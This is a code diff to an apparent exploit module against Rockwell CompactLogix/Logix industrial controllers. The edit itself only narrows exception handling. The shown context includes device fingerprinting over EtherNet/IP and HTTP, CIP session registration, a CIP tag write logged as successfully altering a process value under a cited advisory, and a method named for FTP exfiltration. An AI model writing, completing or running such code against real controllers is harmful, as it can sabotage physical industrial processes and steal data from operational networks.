@@ -132,7 +132,7 @@ class Exploit(Exploit):
                     hint = ("CompactLogix" if "CompactLogix" in text else
                             "Logix" if "Logix" in text else "EtherNet/IP")
                     results.append(f"{hint} at :{self.port}")
-        except Exception:
+        except (ConnectionError, TimeoutError, ValueError, OSError):
             results.append(f"EtherNet/IP:{self.port} not accessible")
 
         url = f"http://{self.target}:{self.web_port}/"
@@ -146,7 +146,7 @@ class Exploit(Exploit):
                 results.append(f"Web [{resp.status}] ({hint}) at :{self.web_port}")
         except urllib.error.HTTPError as exc:
             results.append(f"Web [{exc.code}] at :{self.web_port}")
-        except Exception:
+        except (ValueError, OSError):
             results.append(f"Web not accessible at :{self.web_port}")
 
         verdict = " | ".join(results)
@@ -188,7 +188,7 @@ class Exploit(Exploit):
             except urllib.error.HTTPError as exc:
                 if exc.code not in (404,):
                     logger.info("[*] %s [%d]", path, exc.code)
-            except Exception:
+            except (ValueError, OSError):
                 pass
 
     def _register_session(self) -> int:
@@ -207,7 +207,7 @@ class Exploit(Exploit):
                 resp = sock.recv(28)
                 if len(resp) >= 8:
                     return struct.unpack_from("<I", resp, 4)[0]
-        except Exception:
+        except (ConnectionError, TimeoutError, ValueError, OSError):
             pass
         return 0
 
@@ -226,7 +226,7 @@ class Exploit(Exploit):
                         logger.info("[+] CIP tag write SUCCESSFUL - process value altered (ICSA-26-167-04)")
                     else:
                         logger.info("[*] CIP response status=0x%02x - tag write failed (tag may not exist)", cip_status)
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, ValueError, OSError) as exc:
             logger.warning("[*] CIP write error: %s", exc)
 
     def _ftp_exfil(self) -> None:
@@ -245,6 +245,6 @@ class Exploit(Exploit):
             ftp.quit()
         except ftplib.error_perm as exc:
             logger.info("[*] FTP auth failed: %s", exc)
-        except Exception as exc:
+        except ValueError as exc:
             logger.warning("[*] FTP error: %s", exc)
 
